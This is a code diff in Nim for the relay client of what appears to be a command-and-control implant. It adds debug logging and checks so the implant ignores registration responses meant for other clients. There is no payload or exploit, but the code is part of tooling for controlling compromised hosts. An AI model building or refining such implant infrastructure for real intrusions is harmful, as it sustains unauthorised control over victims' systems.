@@ -1344,6 +1344,9 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         echo "[DEBUG] 🔄 ┌─────────── HTTP RESPONSE FROM RELAY ───────────┐"
                         echo "[DEBUG] 🔄 │ ✅ HTTP RESPONSE FROM RELAY SERVER │"
                         echo "[DEBUG] 🔄 │ Response: " & responsePayload & " │"
+                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message fromID: '" & msg.fromID & "' │"
+                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: My client ID: '" & g_relayClientID & "' │"
+                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message route: " & $msg.route & " │"
                         echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                     
                     if responsePayload == "RESULT_SENT_TO_C2":
@@ -1373,6 +1376,16 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                 echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Current g_relayClientID: '" & g_relayClientID & "'"
                                 let diskID = getStoredImplantID()
                                 echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Stored disk ID: '" & diskID & "'"
+                            
+                            # CRITICAL FIX: Only process registration responses meant for THIS client
+                            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != assignedId:
+                                when defined debug:
+                                    echo "[DEBUG] 🚨 BROADCAST CONTAMINATION DETECTED!"
+                                    echo "[DEBUG] 🚨 This client ID: '" & g_relayClientID & "'"
+                                    echo "[DEBUG] 🚨 Response for ID: '" & assignedId & "'"
+                                    echo "[DEBUG] 🚨 IGNORING response meant for another client!"
+                                # IGNORE responses not meant for this client
+                                continue
                             
                             # Check if this is a new registration or re-registration
                             if regResponse.hasKey("key"):
@@ -1429,6 +1442,8 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                         echo "[DEBUG] 🚨 SERVER CONFIRMED: '" & assignedId & "'"
                                         echo "[DEBUG] 🚨 THIS IS ALSO A BUG! SERVER CONFUSED ABOUT CLIENT ID!"
                                         echo "[DEBUG] 🚨🚨🚨 RE-REGISTRATION ID MISMATCH! 🚨🚨🚨"
+                                        # IGNORE mismatched re-registration responses
+                                        continue
                                 
                                 g_relayClientID = assignedId
                                 # g_relayClientKey stays the same - don't change it!
@@ -1454,7 +1469,22 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                     echo "[DEBUG] ⚠️  CLIENT ID VALIDATION: Unknown registration response format"
                                     echo "[DEBUG] ⚠️  CLIENT ID VALIDATION: Full response: " & $regResponse
                         except:
-                            # Fallback to old format (plain ID)
+                            # Fallback to old format (plain ID) - WITH VALIDATION
+                            when defined debug:
+                                echo "[DEBUG] 🔍 FALLBACK: JSON parsing failed, trying old format"
+                                echo "[DEBUG] 🔍 FALLBACK: responsePayload = '" & responsePayload & "'"
+                                echo "[DEBUG] 🔍 FALLBACK: Current g_relayClientID = '" & g_relayClientID & "'"
+                            
+                            # CRITICAL FIX: Apply same validation for old format
+                            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != responsePayload:
+                                when defined debug:
+                                    echo "[DEBUG] 🚨 FALLBACK CONTAMINATION DETECTED!"
+                                    echo "[DEBUG] 🚨 This client ID: '" & g_relayClientID & "'"
+                                    echo "[DEBUG] 🚨 Response for ID: '" & responsePayload & "'"
+                                    echo "[DEBUG] 🚨 IGNORING old format response meant for another client!"
+                                # IGNORE responses not meant for this client
+                                continue
+                            
                             g_relayClientID = responsePayload
                             storeImplantID(responsePayload)
                             when defined debug:
